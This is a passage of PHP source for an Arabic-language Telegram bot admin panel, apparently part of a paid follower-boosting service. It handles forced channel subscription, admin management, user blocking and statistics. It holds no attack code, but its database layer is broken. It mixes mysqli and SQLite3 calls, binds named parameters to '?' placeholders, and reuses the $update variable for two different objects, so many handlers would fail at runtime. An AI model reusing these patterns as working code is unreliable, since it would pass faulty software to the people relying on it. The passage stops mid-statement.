                        $update->bind_param("iss", $new_count, $joined_users_json, $channel['channel_id']);
                        $update->execute();
                        
                        if($new_count >= $channel_data['required_count'] && $channel_data['required_count'] > 0){
                            $del = $db->prepare("DELETE FROM forced_channels WHERE channel_id = ?");
                            $del->bind_param("s", $channel['channel_id']);
                            $del->execute();
                            
                            bot('sendMessage',[
                                'chat_id' => $channel_data['owner_id'],
                                'text' => "• تم اكتمال العدد المطلوب للقناة\n\nالقناة: {$channel_data['channel_name']}\nالعدد المطلوب: {$channel_data['required_count']}\n\nتم حذف القناة من قائمة الاشتراك الاجباري تلقائياً"
                            ]);
                        }
                    }
                }
            }
        }
    }
    
    if(!empty($channels) && !$all_joined){
        $inline = [];
        foreach($not_joined as $channel){
            $inline['inline_keyboard'][] = [['text' => "• " . $channel['channel_name'], 'url' => $channel['channel_link']]];
        }
        $inline['inline_keyboard'][] = [['text' => "تحقق من الاشتراك", 'callback_data' => "check_subscription"]];
        
        $subscribe_text = getSetting($db, "subscribe_text", "- عذراً . {name}\n- اشترك في القنوات التالية اولا .");
        $subscribe_text = str_replace("{name}", $name, $subscribe_text);
        $subscribe_text = str_replace("{user_id}", $from_id, $subscribe_text);
        
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => $subscribe_text,
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode($inline)
        ]);
        exit;
    }
}

if($data == "check_subscription"){
    $channels = getForcedChannels($db, true);
    $all_joined = true;
    $not_joined = [];

    foreach($channels as $channel){
        $member = GetChatMember($channel['channel_id'], $from_id);
        if($member->result->status == "left"){
            $all_joined = false;
            $not_joined[] = $channel;
        }else{
            updateChannelCount($db, $channel['channel_id'], $from_id);
        }
    }

    if($all_joined){
        $start_text = getSetting($db, "start_text", "مرحبا بك في البوت\nايديك: {user_id}");
        $start_text = str_replace("{bot_name}", $bot_name, $start_text);
        $start_text = str_replace("{user_id}", $from_id, $start_text);
        $start_text = str_replace("{name}", $name, $start_text);
        bot('editMessageText',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $start_text
        ]);
    }else{
        $inline = [];
        foreach($not_joined as $channel){
            $inline['inline_keyboard'][] = [['text' => "• " . $channel['channel_name'], 'url' => $channel['channel_link']]];
        }
        $inline['inline_keyboard'][] = [['text' => "تحقق من الاشتراك", 'callback_data' => "check_subscription"]];

        $subscribe_text = getSetting($db, "subscribe_text", "- عذراً . {name}\n- اشترك في القنوات التالية اولا .");
        $subscribe_text = str_replace("{name}", $name, $subscribe_text);

        bot('editMessageText',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $subscribe_text,
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode($inline)
        ]);
    }
    exit; 
}

if($data == "setting" && isAdmin($db, $from_id)){
    $bot_status = getSetting($db, "bot_status", "✅");
    $twasl_status = getSetting($db, "twasl_status", "❌");
    $notify_status = getSetting($db, "notify_status", "✅");
    $auto_status = getSetting($db, "auto_status", "✅");
    $duplicate_status = getSetting($db, "duplicate_status", "❌");
    $filter_status = getSetting($db, "filter_status", "❌");
    $forced_status = getSetting($db, "forced_subscription", "✅");

    $keyboard = [
        'inline_keyboard' => [
                [['text' => "قسم الاحصائيات 📊", 'callback_data' => "status"]],
                [['text' => "عمل البوت : $bot_status", 'callback_data' => "in|bot"],['text' => " حاله التوجيه : $twasl_status", 'callback_data' => "in|twasl"]], 
                [['text' => " تنبيه الدخول : $notify_status", 'callback_data' => "in|notify"],['text' => "البوت في المجموعات : $auto_status", 'callback_data' => "in|auto"]],
                [['text' => "منع التكرار : $duplicate_status", 'callback_data' => "in|duplicate"],['text' => "تعديل (الازرار)", 'callback_data' => "zrar"],['text' => " التصفيه : $filter_status", 'callback_data' => "in|filter"]],
                [['text' => "قسم الحظر", 'callback_data' => "blockks"],['text' => "قسم الادمنيه", 'callback_data' => "admins"]],
                [['text' => "الاشتراك الاجباري", 'callback_data' => "ijbare"], ['text' => "الاذاعه", 'callback_data' => "broadcast"]],
                [['text' => "النسخ الاحتياطيه", 'callback_data' => "Nsxa"],['text' => "نقل الملكيه", 'callback_data' => "thoilmlk"]],
                [['text' => "• اعدادات البوت •", 'callback_data' => "rshqG"]],
        ]
    ];
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- اهلا بك عزيزي المطور في اعدادات البوت.\n----------------------------",
        'reply_markup' => json_encode($keyboard)
    ]);
    exit;
}

if($ex[0] == "in" && isAdmin($db, $from_id)){
    $key = $ex[1];
    $current = getSetting($db, $key."_status", "❌");
    $new = ($current == "✅") ? "❌" : "✅";
    setSetting($db, $key."_status", $new);

    $bot_status = getSetting($db, "bot_status", "✅");
    $twasl_status = getSetting($db, "twasl_status", "❌");
    $notify_status = getSetting($db, "notify_status", "✅");
    $auto_status = getSetting($db, "auto_status", "✅");
    $duplicate_status = getSetting($db, "duplicate_status", "❌");
    $filter_status = getSetting($db, "filter_status", "❌");
    $forced_status = getSetting($db, "forced_subscription", "✅");

    $keyboard = [
        'inline_keyboard' => [
                [['text' => "قسم الاحصائيات 📊", 'callback_data' => "status"]],
                [['text' => "عمل البوت : $bot_status", 'callback_data' => "in|bot"],['text' => " حاله التوجيه : $twasl_status", 'callback_data' => "in|twasl"]], 
                [['text' => " تنبيه الدخول : $notify_status", 'callback_data' => "in|notify"],['text' => "البوت في المجموعات : $auto_status", 'callback_data' => "in|auto"]],
                [['text' => "منع التكرار : $duplicate_status", 'callback_data' => "in|duplicate"],['text' => "تعديل (الازرار)", 'callback_data' => "zrar"],['text' => " التصفيه : $filter_status", 'callback_data' => "in|filter"]],
                [['text' => "قسم الحظر", 'callback_data' => "blockks"],['text' => "قسم الادمنيه", 'callback_data' => "admins"]],
                [['text' => "الاشتراك الاجباري", 'callback_data' => "ijbare"], ['text' => "الاذاعه", 'callback_data' => "broadcast"]],
                [['text' => "النسخ الاحتياطيه", 'callback_data' => "Nsxa"],['text' => "نقل الملكيه", 'callback_data' => "thoilmlk"]],
                [['text' => "• اعدادات البوت •", 'callback_data' => "rshqG"]],
        ]
    ];
    bot('EditMessageReplyMarkup',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'reply_markup' => json_encode($keyboard)
    ]);
    exit;
}

if($data == "ijbare" && isAdmin($db, $from_id)){
    $channels = $db->query("SELECT * FROM forced_channels");
    $key = ['inline_keyboard' => []];
    while($row = $channels->fetch_assoc()){
        $remaining = $row['required_count'] - $row['current_count'];
        $status_text = $row['is_active'] == 1 ? "مفعل" : "معطل";
        $key['inline_keyboard'][] = [
            ['text' => trim($row['channel_name']), 'callback_data' => "edit_channel|" . $row['channel_id']],
            ['text' => "$remaining", 'callback_data' => "noop"]
        ];
    }
    $key['inline_keyboard'][] = [['text' => "اضافه قناة", 'callback_data' => "add_channel"]];
    $key['inline_keyboard'][] = [['text' => "الاعدادات", 'callback_data' => "forced_settings"]];
    $key['inline_keyboard'][] = [['text' => "• تفعيل النظام : " . getSetting($db, "forced_subscription", "✅"), 'callback_data' => "toggle_forced"]];
    $key['inline_keyboard'][] = [['text' => "رجوع", 'callback_data' => "setting"]];

    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- اهلا بك في قسم قنوات الاشتراك الاجباري.",
        'reply_markup' => json_encode($key)
    ]);
    exit;
}

if($data == "forced_settings" && isAdmin($db, $from_id)){
    $subscribe_text = getSetting($db, "subscribe_text", "- عذراً . {name}\n- اشترك في القنوات التالية اولا .");
    $start_text = getSetting($db, "start_text", "مرحبا بك في البوت\nايديك: {user_id}");

    $key = [
        'inline_keyboard' => [
            [['text' => "تعيين رسالة الاشتراك", 'callback_data' => "set_subscribe_text"]],
            [['text' => "تعيين رسالة الترحيب", 'callback_data' => "set_start_text"]],
            [['text' => "رجوع", 'callback_data' => "ijbare"]],
        ]
    ];

    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "اعدادات الاشتراك الاجباري\n\nرسالة الاشتراك:\n$subscribe_text\n\nرسالة الترحيب:\n$start_text",
        'reply_markup' => json_encode($key)
    ]);
    exit;
}

if($data == "set_subscribe_text" && isAdmin($db, $from_id)){
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل رسالة الاشتراك الجديدة\n\nيمكنك استخدام:\n{name} - اسم المستخدم\n{user_id} - ايدي المستخدم",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "forced_settings"]]]])
    ]);
    setSetting($db, "set_subscribe_mode", $from_id);
    exit;
}

if($data == "set_start_text" && isAdmin($db, $from_id)){
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل رسالة الترحيب الجديدة\n\nيمكنك استخدام:\n{bot_name} - اسم البوت\n{name} - اسم المستخدم\n{user_id} - ايدي المستخدم",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "forced_settings"]]]])
    ]);
    setSetting($db, "set_start_mode", $from_id);
    exit;
}

if($text && getSetting($db, "set_subscribe_mode") == $from_id){
    setSetting($db, "subscribe_text", $text);
    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "تم تعيين رسالة الاشتراك بنجاح",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "forced_settings"]]]])
    ]);
    setSetting($db, "set_subscribe_mode", "");
    exit;
}

if($text && getSetting($db, "set_start_mode") == $from_id){
    setSetting($db, "start_text", $text);
    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "تم تعيين رسالة الترحيب بنجاح",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "forced_settings"]]]])
    ]);
    setSetting($db, "set_start_mode", "");
    exit;
}

if($data == "toggle_forced" && isAdmin($db, $from_id)){
    $current = getSetting($db, "forced_subscription", "✅");
    $new = ($current == "✅") ? "❌" : "✅";
    setSetting($db, "forced_subscription", $new);

    bot('answerCallbackQuery',[
        'callback_query_id' => $callback_query->id,
        'text' => "تم " . ($new == "✅" ? "تفعيل" : "تعطيل") . " نظام الاشتراك الاجباري",
        'show_alert' => true
    ]);

    $channels = $db->query("SELECT * FROM forced_channels");
    $key = ['inline_keyboard' => []];
    while($row = $channels->fetch_assoc()){
        $remaining = $row['required_count'] - $row['current_count'];
        $key['inline_keyboard'][] = [
            ['text' => trim($row['channel_name']), 'callback_data' => "edit_channel|" . $row['channel_id']],
            ['text' => "$remaining", 'callback_data' => "noop"]
        ];
    }
    $key['inline_keyboard'][] = [['text' => "اضافه قناة", 'callback_data' => "add_channel"]];
    $key['inline_keyboard'][] = [['text' => "الاعدادات", 'callback_data' => "forced_settings"]];
    $key['inline_keyboard'][] = [['text' => "• تفعيل النظام : " . getSetting($db, "forced_subscription", "✅"), 'callback_data' => "toggle_forced"]];
    $key['inline_keyboard'][] = [['text' => "رجوع", 'callback_data' => "setting"]];

    bot('editMessageReplyMarkup',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'reply_markup' => json_encode($key)
    ]);
    exit;
}

if($data == "add_channel" && isAdmin($db, $from_id)){
    bot('editMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- قم برفع البوت ادمن في قناتك ثم قم بأرسل توجيه من القناه الى البوت.",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "ijbare"]]]])
    ]);
    setSetting($db, "add_channel_mode", $from_id);
    exit;
}

if($forward_from_chat && getSetting($db, "add_channel_mode") == $from_id){
    $channel_id = $forward_from_chat->id;
    $channel_title = $forward_from_chat->title;
    $channel_link = "https://t.me/" . ($forward_from_chat->username ?? "");

    $check = $db->prepare("SELECT * FROM forced_channels WHERE channel_id = ?");
    $check->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
    $result = $check->execute();

    if(!$result->fetch_assoc()){
        $member = GetChatMember($channel_id, $bot_id);
        if($member->result->status == "administrator" || $member->result->status == "creator"){
            $stmt = $db->prepare("INSERT INTO forced_channels (channel_id, channel_name, channel_link, required_count, current_count, is_active, joined_users, owner_id) VALUES (:channel_id, :channel_name, :channel_link, 0, 0, 1, '[]', :owner_id)");
            $stmt->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
            $stmt->bindValue(':channel_name', $channel_title, SQLITE3_TEXT);
            $stmt->bindValue(':channel_link', $channel_link, SQLITE3_TEXT);
            $stmt->bindValue(':owner_id', $from_id, SQLITE3_INTEGER);
            $stmt->execute();

            bot('sendMessage',[
                'chat_id' => $chat_id,
                'text' => "تم حفظ القناه بنجاح\nيمكنك الان تعديل العدد المطلوب من اعدادات القناة",
                'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "ijbare"]]]])
            ]);
        }else{
            bot('sendMessage',[
                'chat_id' => $chat_id,
                'text' => "البوت ليس مشرف بالقناه.",
                'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "ijbare"]]]])
            ]);
        }
    }else{
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "تم اضافه القناه سابقا.",
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "ijbare"]]]])
        ]);
    }
    setSetting($db, "add_channel_mode", "");
    exit;
}

if($ex[0] == "edit_channel" && isAdmin($db, $from_id)){
    $channel_id = $ex[1];
    $stmt = $db->prepare("SELECT * FROM forced_channels WHERE channel_id = :channel_id");
    $stmt->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
    $result = $stmt->execute();
    $channel = $result->fetch_assoc();

    if($channel){
        $remaining = $channel['required_count'] - $channel['current_count'];
        $status_text = $channel['is_active'] == 1 ? "مفعل" : "معطل";

        $key = [
            'inline_keyboard' => [
                [['text' => "تبديل الحالة ($status_text)", 'callback_data' => "toggle_channel_status|$channel_id"]],
                [['text' => "تعديل العدد المطلوب", 'callback_data' => "edit_channel_count|$channel_id"]],
                [['text' => "حذف القناة", 'callback_data' => "delete_channel|$channel_id"]],
                [['text' => "رجوع", 'callback_data' => "ijbare"]],
            ]
        ];

        bot('EditMessageText',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "معلومات القناة\n\nاسم القناة: {$channel['channel_name']}\nالعدد المطلوب: {$channel['required_count']}\nالعدد الحالي: {$channel['current_count']}\nالمتبقي: $remaining\nالحالة: $status_text",
            'reply_markup' => json_encode($key)
        ]);
    }
    exit;
}

if($ex[0] == "toggle_channel_status" && isAdmin($db, $from_id)){
    $channel_id = $ex[1];
    $stmt = $db->prepare("SELECT is_active FROM forced_channels WHERE channel_id = :channel_id");
    $stmt->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
    $result = $stmt->execute();
    $channel = $result->fetch_assoc();

    if($channel){
        $new_status = $channel['is_active'] == 1 ? 0 : 1;
        $update = $db->prepare("UPDATE forced_channels SET is_active = :is_active WHERE channel_id = :channel_id");
        $update->bindValue(':is_active', $new_status, SQLITE3_INTEGER);
        $update->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
        $update->execute();

        bot('answerCallbackQuery',[
            'callback_query_id' => $callback_query->id,
            'text' => "تم " . ($new_status == 1 ? "تفعيل" : "تعطيل") . " القناة",
            'show_alert' => true
        ]);

        $stmt2 = $db->prepare("SELECT * FROM forced_channels WHERE channel_id = ?");
        $stmt2->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
        $result2 = $stmt2->execute();
        $channel2 = $result2->fetch_assoc();

        $remaining = $channel2['required_count'] - $channel2['current_count'];
        $status_text = $channel2['is_active'] == 1 ? "مفعل" : "معطل";

        $key = [
            'inline_keyboard' => [
                [['text' => "تبديل الحالة ($status_text)", 'callback_data' => "toggle_channel_status|$channel_id"]],
                [['text' => "تعديل العدد المطلوب", 'callback_data' => "edit_channel_count|$channel_id"]],
                [['text' => "حذف القناة", 'callback_data' => "delete_channel|$channel_id"]],
                [['text' => "رجوع", 'callback_data' => "ijbare"]],
            ]
        ];

        bot('editMessageReplyMarkup',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'reply_markup' => json_encode($key)
        ]);
    }
    exit;
}

if($ex[0] == "edit_channel_count" && isAdmin($db, $from_id)){
    $channel_id = $ex[1];
    setSetting($db, "edit_channel_id", $channel_id);
    setSetting($db, "edit_channel_mode", $from_id);

    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل العدد الجديد المطلوب من المشتركين (بالأرقام فقط)\n0 يعني لا يوجد حد",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "edit_channel|$channel_id"]]]])
    ]);
    exit;
}

if($text && getSetting($db, "edit_channel_mode") == $from_id && is_numeric($text)){
    $channel_id = getSetting($db, "edit_channel_id", "");
    $new_count = intval($text);

    $update = $db->prepare("UPDATE forced_channels SET required_count = :required_count WHERE channel_id = :channel_id");
    $update->bindValue(':required_count', $new_count, SQLITE3_INTEGER);
    $update->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
    $update->execute();

    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "تم تعديل العدد المطلوب الى $new_count عضو",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "edit_channel|$channel_id"]]]])
    ]);

    setSetting($db, "edit_channel_mode", "");
    setSetting($db, "edit_channel_id", "");
    exit;
}

if($ex[0] == "delete_channel" && isAdmin($db, $from_id)){
    $channel_id = $ex[1];
    $del = $db->prepare("DELETE FROM forced_channels WHERE channel_id = :channel_id");
    $del->bindValue(':channel_id', $channel_id, SQLITE3_TEXT);
    $del->execute();

    bot('answerCallbackQuery',[
        'callback_query_id' => $callback_query->id,
        'text' => "تم حذف القناة بنجاح",
        'show_alert' => true
    ]);

    $channels = $db->query("SELECT * FROM forced_channels");
    $key = ['inline_keyboard' => []];
    while($row = $channels->fetch_assoc()){
        $remaining = $row['required_count'] - $row['current_count'];
        $key['inline_keyboard'][] = [
            ['text' => trim($row['channel_name']), 'callback_data' => "edit_channel|" . $row['channel_id']],
            ['text' => "$remaining", 'callback_data' => "noop"]
        ];
    }
    $key['inline_keyboard'][] = [['text' => "اضافه قناة", 'callback_data' => "add_channel"]];
    $key['inline_keyboard'][] = [['text' => "الاعدادات", 'callback_data' => "forced_settings"]];
    $key['inline_keyboard'][] = [['text' => "• تفعيل النظام : " . getSetting($db, "forced_subscription", "✅"), 'callback_data' => "toggle_forced"]];
    $key['inline_keyboard'][] = [['text' => "رجوع", 'callback_data' => "setting"]];

    bot('editMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- اهلا بك في قسم قنوات الاشتراك الاجباري.",
        'reply_markup' => json_encode($key)
    ]);
    exit;
}

// --- بداية قسم الإدارة (حذف وإضافة وتعديل) ---
if($data == "admins" && isAdmin($db, $from_id) && $from_id == $owner_id){
    $admins_list = $db->query("SELECT user_id FROM admins");
    $key = ['inline_keyboard' => []];
    if($admins_list){
        while($row = $admins_list->fetch_assoc()){
            $admin_uid = $row['user_id'];
            $link = "tg://openmessage?user_id=$admin_uid";
            // تم تعديل الخطأ ليعمل زر الحذف بشكل سليم
            $key['inline_keyboard'][] = [['text' => "$admin_uid", 'url' => $link], ['text' => "حــذف 🗑", 'callback_data' => "deletead|$admin_uid"]];
        }
    }
    $key['inline_keyboard'][] = [['text' => "اضف ادمن جديد ➕", 'callback_data' => "addadmin"]];
    $key['inline_keyboard'][] = [['text' => "رجوع ⬅️", 'callback_data' => "setting"]];

    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "👨‍💻 *مرحباً بك في قسم الأدمنية*\n\nيمكنك رفع 7 آدمنية في البوت أو حذفهم.\nالأدمن يمكنه التحكم في لوحة البوت مثلك، لكن لا يمكنه رفع آدمنية آخرين، أو استلام رسائل التواصل.\n\n👇 *قائمة الأدمنية الحاليين:*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode($key)
    ]);
    exit;
}

if($ex[0] == "deletead" && $from_id == $owner_id){
    $user_id = $ex[1] ?? "";
    if($user_id != $owner_id){
        $stmt = $db->prepare("DELETE FROM admins WHERE user_id = ?");
        if($stmt){
            $stmt->bind_param("s", $user_id);
            $stmt->execute();
        }
        
        // إرسال إشعار للآدمن اللي اتحذف
        bot('sendMessage',[
            'chat_id' => $user_id,
            'text' => "⚠️ *إشعار إداري*\n\nلقد تم إعفائك من منصب (الآدمن) من قبل المالك الأساسي.\nتم سحب جميع صلاحيات الإدارة الخاصة بك بنجاح.",
            'parse_mode' => 'markdown'
        ]);

        bot('answerCallbackQuery',[
            'callback_query_id' => $update->callback_query->id,
            'text' => "تم حذف الآدمن وإرسال إشعار له بنجاح ✅",
            'show_alert' => true
        ]);
        
        $admins_list = $db->query("SELECT user_id FROM admins");
        $key = ['inline_keyboard' => []];
        if($admins_list){
            while($row = $admins_list->fetch_assoc()){
                $admin_uid = $row['user_id'];
                $link = "tg://openmessage?user_id=$admin_uid";
                $key['inline_keyboard'][] = [['text' => "$admin_uid", 'url' => $link], ['text' => "حــذف 🗑", 'callback_data' => "deletead|$admin_uid"]];
            }
        }
        $key['inline_keyboard'][] = [['text' => "اضف ادمن جديد ➕", 'callback_data' => "addadmin"]];
        $key['inline_keyboard'][] = [['text' => "رجوع ⬅️", 'callback_data' => "setting"]];
        
        bot('editMessageReplyMarkup',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'reply_markup' => json_encode($key)
        ]);
    }else{
        bot('answerCallbackQuery',[
            'callback_query_id' => $update->callback_query->id,
            'text' => "❌ لا يمكنك حذف المالك الأساسي!",
            'show_alert' => true
        ]);
    }
    exit;
}

if($data == "addadmin" && $from_id == $owner_id){
    $result = $db->query("SELECT COUNT(*) as count FROM admins");
    $admin_count = $result ? $result->fetch_assoc()['count'] : 0;
    
    if($admin_count <= 7){
        bot('editMessageText',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "📌 *أرسل أيدي الشخص الآن لرفعه كآدمن:*",
            'parse_mode' => 'markdown',
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع ⬅️", 'callback_data' => "admins"]]]])
        ]);
        setSetting($db, "addadmin_mode", $from_id);
    }else{
        bot('editMessageText',[
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "❌ لا يمكنك رفع أكثر من 7 آدمنية في البوت.",
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع ⬅️", 'callback_data' => "admins"]]]])
        ]);
    }
    exit;
}

if($text && getSetting($db, "addadmin_mode") == $from_id && is_numeric($text)){
    // الإضافة المباشرة
    $add_stmt = $db->prepare("REPLACE INTO admins (user_id) VALUES (?)");
    $add_stmt->bind_param("s", $text);
    $add_stmt->execute();

    // إرسال رسالة للآدمن الجديد
    bot('sendMessage',[
        'chat_id' => $text,
        'text' => "🎉 *تهانينا!*\n\nتم رفعك كآدمن في البوت من قبل المالك الأساسي.\nيمكنك الآن التحكم في البوت والوصول إلى لوحة التحكم عبر إرسال أمر /start.",
        'parse_mode' => 'markdown'
    ]);

    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "✅ *تمت إضافته إلى قائمة الأدمنية وإرسال إشعار له بنجاح.*",
        'parse_mode' => 'markdown',
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع لقائمة الإدارة ⬅️", 'callback_data' => "admins"]]]])
    ]);
    setSetting($db, "addadmin_mode", "");
    exit;
}
// --- نهاية قسم الإدارة ---

if($data == "blockks" && isAdmin($db, $from_id)){
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "مسح المحظورين", 'callback_data' => "delblock"]],
            [['text' => "حظر شخص", 'callback_data' => "bloccr"], ['text' => "الغاء حظر", 'callback_data' => "unbloc"]],
            [['text' => "رجوع", 'callback_data' => "setting"]],
        ]
    ];
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "- اهلا بك في قائمه الحظر.\nعدد المحظورين : $total_blocked",
        'reply_markup' => json_encode($keyboard)
    ]);
    exit;
}

if($data == "delblock" && isAdmin($db, $from_id)){
    $db->query("DELETE FROM blocked_users");
    bot('answerCallbackQuery',[
        'callback_query_id' => $callback_query->id,
        'text' => "تم حذف $total_blocked محظورين في البوت",
        'show_alert' => true
    ]);
    exit;
}

if($data == "bloccr" && isAdmin($db, $from_id)){
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل ايدي العضو لحظره",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "blockks"]]]])
    ]);
    setSetting($db, "block_mode", $from_id);
    exit;
}

if($data == "unbloc" && isAdmin($db, $from_id)){
    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "ارسل ايدي لفك حظره",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "blockks"]]]])
    ]);
    setSetting($db, "unblock_mode", $from_id);
    exit;
}

if($text && getSetting($db, "block_mode") == $from_id && is_numeric($text)){
    $user_exists = $db->prepare("SELECT * FROM users WHERE id = ?");
    $user_exists->bind_param("i", $text);
    $result = $user_exists->execute();
    if($result->fetch_assoc()){
        $stmt = $db->prepare("INSERT OR IGNORE INTO blocked_users (user_id) VALUES (:user_id)");
        $stmt->bind_param("i", $text);
        $stmt->execute();

        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "تم حظر العضو بنجاح\n---------------------\nايديه : `$text`",
            'parse_mode' => "markdown",
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "الغاء حظر", 'callback_data' => "unblock|$text"]]]])
        ]);
    }else{
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "هذا العضو غير موجود\nايديه : `$text`",
            'parse_mode' => "markdown",
            'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "blockks"]]]])
        ]);
    }
    setSetting($db, "block_mode", "");
    exit;
}

if($text && getSetting($db, "unblock_mode") == $from_id && is_numeric($text)){
    $stmt = $db->prepare("DELETE FROM blocked_users WHERE user_id = :user_id");
    $stmt->bind_param("i", $text);
    $stmt->execute();

    bot('sendMessage',[
        'chat_id' => $chat_id,
        'text' => "تم الغاء حظره بنجاح\n---------------------\nايديه : `$text`",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "حظر", 'callback_data' => "block|$text"], ['text' => "رجوع", 'callback_data' => "blockks"]]]])
    ]);
    setSetting($db, "unblock_mode", "");
    exit;
}

// --- قسم الإحصائيات الشامل ---
if(($data == "status" || $data == "refresh_status") && isAdmin($db, $from_id)){
    
    // 1. المستخدمين من قواعد البيانات
    $total_users = $db->query("SELECT COUNT(*) as count FROM users")->fetch_assoc()['count'] ?? 0;
    
    // 2. الحساب الفعلي للخدمات المضافة في البوت
    $total_services = 0;
    if(isset($rshq['xdmaxs']) && is_array($rshq['xdmaxs'])){
        foreach($rshq['xdmaxs'] as $sec) {
            if(is_array($sec)){
                foreach($sec as $srv){
                    if($srv != null) $total_services++;
                }
            }
        }
    }
    
    // 3. التحويلات والطلبات والنقاط
    $transfers = count($rshq['thoiler'] ?? []);
    
    $total_orders = $rshq['bot_tlb'] ?? 0;
    if($total_orders == 0 && isset($rshq['order'])){
        $total_orders = count($rshq['order']);
    }
    
    $total_sales_points = 0;
    if(isset($rshq['cointlb']) && is_array($rshq['cointlb'])){
        $total_sales_points = array_sum($rshq['cointlb']);
    }
    
    // 4. التسليم والمدفوعات (من قسم الشحن التلقائي)
    $paid_users = count($rshq['asia_stats']['users_completed'] ?? []) + count($rshq['stars_stats']['users_completed'] ?? []);
    $total_paid = ($rshq['asia_stats']['total_points'] ?? 0) + ($rshq['stars_stats']['total_stars'] ?? 0) * ($rshq['stars_settings']['points_per_star'] ?? 10);
    $payment_orders = ($rshq['asia_stats']['completed'] ?? 0) + ($rshq['stars_stats']['completed'] ?? 0);

    $current_time = date('Y-m-d h:i A');

    $msg = "📊 *إحصائيات البوت الحقيقية*\n\n"
         . "━━━━ 👥 *المستخدمون* ━━━━\n"
         . "👥 الإجمالي: `$total_users`\n"
         . "🛒 عدد الخدمات: `$total_services`\n"
         . "📈 روابط التحويل: `$transfers`\n\n"
         . "━━━━ 🛒 *الطلبات* ━━━━\n"
         . "🌍 إجمالي الطلبات: `$total_orders`\n"
         . "💰 النقاط المستهلكة: `$total_sales_points` نقطة\n\n"
         . "━━━━ 📤 *عمليات الشحن* ━━━━\n"
         . "👷 مستخدمين شحنوا: `$paid_users`\n"
         . "💸 إجمالي النقاط المشحونة: `$total_paid` نقطة\n"
         . "📋 عمليات الشحن الناجحة: `$payment_orders`\n\n"
         . "⌚ أخر تحديث: `$current_time`";

    $keys = [
        'inline_keyboard' => [
            [['text' => "تحديث 🔄", 'callback_data' => "refresh_status"]],
            [['text' => "رجوع ⬅️", 'callback_data' => "setting"]]
        ]
    ];

    bot('EditMessageText',[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $msg,
        'parse_mode' => 'markdown',
        'reply_markup' => json_encode($keys)
    ]);

    if($data == "refresh_status"){
        bot('answerCallbackQuery',[
            'callback_query_id' => $update->callback_query->id,
            'text' => "تم التحديث (الخدمات: $total_services | الطلبات: $total_orders) ✅",
            'show_alert' => false
        ]);
    }
    exit;
}

if($data == "Nsxa" && isAdmin($db, $from_id)){
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "جلب نسخه احتياطيه", 'callback_data' => "get_backup"]],
